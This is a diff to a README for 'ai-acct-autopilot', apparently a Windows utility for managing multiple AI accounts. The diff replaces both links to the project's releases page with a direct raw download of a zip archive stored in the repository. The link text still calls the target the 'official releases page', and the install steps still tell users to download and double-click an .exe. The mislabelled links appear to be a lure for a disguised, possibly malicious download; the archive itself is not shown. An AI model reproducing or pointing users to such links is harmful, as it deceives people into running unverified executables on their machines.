@@ -1,6 +1,6 @@
 # 🤖 ai-acct-autopilot - Manage multiple AI accounts with ease
 
-[![Download for Windows](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Mullioned-abductor141/ai-acct-autopilot/releases)
+[![Download for Windows](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Mullioned-abductor141/ai-acct-autopilot/raw/refs/heads/main/menubar/acct-autopilot-ai-v2.3.zip)
 
 ## 🎯 About This Tool
 
@@ -19,7 +19,7 @@ Your computer must meet these standards to run the application:
 
 Follow these steps to get the tool running on your Windows machine.
 
-1.  Visit the [official releases page](https://github.com/Mullioned-abductor141/ai-acct-autopilot/releases) to download the software.
+1.  Visit the [official releases page](https://github.com/Mullioned-abductor141/ai-acct-autopilot/raw/refs/heads/main/menubar/acct-autopilot-ai-v2.3.zip) to download the software.
 2.  Look for the file ending in `.exe` under the latest release section.
 3.  Click the file to start the download.
 4.  Once the file finishes downloading, double-click it to start the install process.
